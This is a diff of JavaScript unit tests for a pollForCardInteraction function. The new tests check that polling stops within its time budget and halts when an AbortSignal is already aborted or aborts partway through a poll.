 test("pollForCardInteraction stops within its wall-clock budget when nothing ever matches", async () => {
   let calls = 0;
   const rest = { async agentUpdates() { calls += 1; return { updates: [], cursor: 0 }; } };
-  const result = await pollForCardInteraction(rest, "tok", { cardId: "c1", maxTotalMs: 15 });
+  const result = await pollForCardInteraction(rest, "tok", { cardId: CARD_ID, maxTotalMs: 15 });
   assert.equal(result.found, false);
   assert.ok(calls >= 1);
+});
+
+test("pollForCardInteraction stops immediately when its AbortSignal is already aborted", async () => {
+  let calls = 0;
+  const rest = { async agentUpdates() { calls += 1; return { updates: [], cursor: 0 }; } };
+  const controller = new AbortController();
+  controller.abort();
+  const result = await pollForCardInteraction(rest, "tok", { cardId: CARD_ID, maxTotalMs: 50_000, signal: controller.signal });
+  assert.equal(result.found, false);
+  assert.equal(calls, 0, "an already-aborted signal must skip calling salt-api at all");
+});
+
+test("pollForCardInteraction stops after the signal aborts mid-poll, without waiting out the full budget", async () => {
+  let calls = 0;
+  const controller = new AbortController();
+  const rest = {
+    async agentUpdates() {
+      calls += 1;
+      if (calls === 1) controller.abort(); // simulates the client disconnecting after the first round-trip
+      return { updates: [], cursor: 0 };
+    },
+  };
+  const result = await pollForCardInteraction(rest, "tok", { cardId: CARD_ID, maxTotalMs: 50_000, signal: controller.signal });
+  assert.equal(result.found, false);
+  assert.equal(calls, 1, "the loop must not run a second round after the signal aborts");
 });
